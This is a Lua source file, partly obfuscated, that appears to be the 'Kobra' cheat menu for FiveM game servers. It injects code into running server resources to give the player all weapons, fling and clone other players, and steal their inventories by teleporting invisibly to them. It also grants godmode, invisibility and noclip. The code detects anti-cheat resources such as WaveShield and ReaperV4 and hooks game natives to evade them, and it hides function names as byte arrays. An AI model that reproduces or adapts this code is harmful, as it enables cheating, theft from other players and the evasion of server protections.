                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]]);end;v12.RemoveAllWeapons=function(v251) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]]);end;v12.HandleLaunchPlayer=function(v252,v253,v254) local v255=0 + 0 ;local v256;local v257;while true do if (v255==0) then if ( not v253 or ( #v253==(0 -0))) then return;end v256=tonumber(v253[1]);v255=1 + 0 ;end if (v255==3) then CreateThread(function() local v704=0;local v705;local v706;local v707;local v708;local v709;local v710;local v711;local v712;local v713;while true do if (v704==(2 + 2)) then for v1017=854 -(152 + 701) ,1326 -(430 + 881)  do if  not DoesEntityExist(v706) then break;end local v1018=GetEntityCoords(v706);if  not v1018 then break;end SetEntityCoords(v707,v1018.x,v1018.y,v1018.z + 0.5 + 0 ,false,false,false,false);Wait(945 -(557 + 338) );AttachEntityToEntityPhysically(v707,v706,0,0,0 + 0 ,0 -0 ,525 -375 ,0 -0 ,0 -0 ,0,0,0,802 -(499 + 302) ,false,false,867 -(39 + 827) ,2);Wait(138 -88 );DetachEntity(v707,true,true);Wait(223 -123 );end Wait(1985 -1485 );ClearPedTasksImmediately(v707);if v712 then SetEntityCoords(v707,v712.x,v712.y,v712.z + 1 ,false,false,false,false);Wait(153 -53 );SetEntityCoords(v707,v712.x,v712.y,v712.z,false,false,false,false);end v704=1 + 4 ;end if (v704==(14 -9)) then if v711 then SetEntityVisible(v707,true,0 + 0 );end break;end if (v704==(1 -0)) then v707=PlayerPedId();if  not v707 then return;end v708=GetEntityCoords(v707);v709=GetEntityCoords(v706);v704=106 -(103 + 1) ;end if ((554 -(475 + 79))==v704) then v705=GetPlayerFromServerId(v256);if ( not v705 or (v705== -1)) then return;end v706=GetPlayerPed(v705);if ( not v706 or  not DoesEntityExist(v706)) then return;end v704=2 -1 ;end if (v704==3) then if (v710>(32 -22)) then local v1108=0 + 0 ;local v1109;local v1110;local v1111;local v1112;local v1113;while true do if (v1108==(0 + 0)) then v712=v708;v1109=math.random() * (1505 -(1395 + 108)) * math.pi ;v1108=1;end if (v1108==(11 -7)) then v711=true;Wait(100);break;end if (v1108==(1205 -(7 + 1197))) then v1110=math.random(3 + 2 ,9);v1111=math.cos(v1109) * v1110 ;v1108=1 + 1 ;end if (v1108==2) then v1112=math.sin(v1109) * v1110 ;v1113=vector3(v709.x + v1111 ,v709.y + v1112 ,v709.z);v1108=322 -(27 + 292) ;end if (v1108==(8 -5)) then SetEntityCoordsNoOffset(v707,v1113.x,v1113.y,v1113.z,false,false,false);SetEntityVisible(v707,false,0 -0 );v1108=4;end end end v713=v257(v709,v254);if ( #v713==0) then end ClearPedTasksImmediately(v707);v704=4;end if (v704==(8 -6)) then if ( not v708 or  not v709) then return;end v710= #(v708-v709);v711=false;v712=nil;v704=3;end end end);break;end if (v255==(1 -0)) then if  not v256 then return;end v254=v254 or 3000 ;v255=3 -1 ;end if (v255==(141 -(43 + 96))) then v257=nil;function v257(v714,v715) local v716={};local v717=PlayerPedId();if  not v717 then return v716;end for v768=0 -0 ,255 do local v769=0 -0 ;local v770;while true do if (v769==(0 + 0)) then v770=GetPlayerFromServerId(v768);if (v770 and (v770~= -(1 + 0)) and DoesEntityExist(GetPlayerPed(v770))) then local v1184=GetPlayerPed(v770);local v1185=GetEntityCoords(v1184);if v1185 then local v1243= #(v714-v1185);if (v1243<=v715) then table.insert(v716,{player=v770,serverId=v768});end end end break;end end end return v716;end v255=5 -2 ;end end end;v12.HandleClonePlayer=function(v258,v259) if ( not v259 or ( #v259==0)) then return;end local v260=table.concat(v259,",");MachoInjectResourceRaw("any",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]],v260));end;v12.HandleTakeInventory=function(v261,v262) if ( not v262 or ( #v262==(0 + 0))) then return;end local v263=tonumber(v262[1 -0 ]);if  not v263 then return;end print("Take Inventory action executed for players: "   .. table.concat(v262,", ") );local v264=GetResourceState("WaveShield")=="started" ;if v264 then MachoInjectResourceRaw("ox_inventory",string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("Kobra Coroutine error:", err); break end
            _w(0)
        end
    ]],v263));else MachoInjectResource2(NewThreadNs,"ox_inventory",string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]],v263));end end;v12.BuildMenuFromWeaponList=function(v265,v266) local v267={};for v339,v340 in ipairs(v266) do if v46[v340] then v267[ #v267 + 1 + 0 ]=v46[v340].label;end end return v267;end;v12.GetWeaponModelFromLabel=function(v268,v269) for v341,v342 in pairs(v46) do if (v342.label==v269) then return v341;end end return "";end;v12.RepairVehicle=function(v270) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]]);end;local v93=GetResourceState("ReaperV4")=="started" ;local v94=GetResourceState("WaveShield")=="started" ;local v95=GetResourceState("qb-jail")=="started" ;v12.BuildDefaultMenu=function(v271) v16={{label="Self",type="subMenu",categories={{label="Player",tabs={{type="button",label="Revive",desc="This will attempt to revive you by script.",onSelect=function() local v343={amigo=function() v48("amigo",[[ respawnPlayer() ]]);end,TrappinBridge=function() v48("new",[[ LocalPlayer.state:set('isDead', false, true) ]]);end,["rzrp-base"]=function() MachoInjectResource2(AsThreadNs,"rzrp-base",[[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]]);end,FiveStar=function() MachoInjectResourceRaw("FiveStar",[[
                                    if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.Kobra.TSEvent('revive:Player:Dead')
                                        end)
                                    ]]);end,scripts=function() if (GetResourceState("scripts")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(1940 -(1642 + 298) ,"scripts","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,framework=function() if (GetResourceState("framework")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(0,"framework","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,["qb-jail"]=function() if v95 then if v93 then MachoInjectThread(0 -0 ,"scripts","",[[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]]);else TriggerEvent("hospital:client:Revive");end end end,wasabi_ambulance=function() print("2");local v534=GetResourceState("WaveShield")=="started" ;local v535=GetResourceState("ReaperV4")=="started" ;if v534 then MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);elseif v535 then MachoInjectThread(0 -0 ,"wasabi_ambulance","",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);else MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);end end,["mc9-medicsystem"]=function() print("1");local v536=GetResourceState("WaveShield")=="started" ;local v537=GetResourceState("ReaperV4")=="started" ;if v536 then MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);elseif v537 then MachoInjectThread(0 -0 ,"mc9-medicsystem","",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);else MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);end end};for v538,v539 in pairs(v343) do if (GetResourceState(v538)=="started") then v539();end end end},{type="slider",label="Health",desc="This will set your health to the desired amount.",scrollType="onEnter",value=78 + 22 ,min=972 -(357 + 615) ,max=71 + 29 ,step=1,onSelect=function(v344) SetEntityHealth(PlayerPedId(),v344 + (245 -145) );end},{type="slider",label="Armour",desc="This will set your armour to the desired amount.",scrollType="onEnter",value=214 -114 ,min=0 + 0 ,max=7 + 93 ,step=1 + 0 ,onSelect=function(v345) SetPedArmour(PlayerPedId(),v345);end},{type="button",label="Refill Health",desc="This will refill your health to the maximum value.",onSelect=function() SetEntityHealth(PlayerPedId(),GetEntityMaxHealth(PlayerPedId()));end},{type="button",label="Refill Armour",desc="This will refill your armour to the maximum value.",onSelect=function() SetPedArmour(PlayerPedId(),100);end},{type="checkbox",label="Godmode",checked=false,desc="This will give your player godmode.",onSelect=function(v346) v271:HandleGodmodeToggle(v346);end},{type="checkbox",label="Invisibility",checked=false,desc="This will make your player invisible.",onSelect=function(v347) if v347 then v271:EnableInvisibility();else v271:DisableInvisibility();end end},{type="divider",label="Movement"},{type="slider-checkbox",label="Noclip",scrollType="onScroll",checked=false,value=0.25 -0 ,step=0.25,min=0.25,max=5,onSelect=function(v348,v349) if v349 then local v591=0;while true do if (v591==(95 -(9 + 86))) then if  not v29 then local v1019=421 -(275 + 146) ;while true do if ((1 + 0)==v1019) then v29=true;break;end if (v1019==(64 -(29 + 35))) then v12:Notify("info","Kobra","Initializing... Please wait!",4431 -3431 );Wait(1194 -794 );v1019=4 -3 ;end end end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                _G.KobraNoclipSpeed = ]]   .. v348   .. [[
                                if not _G.KobraNoclipThreadRunning then
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.KobraNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.KobraNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
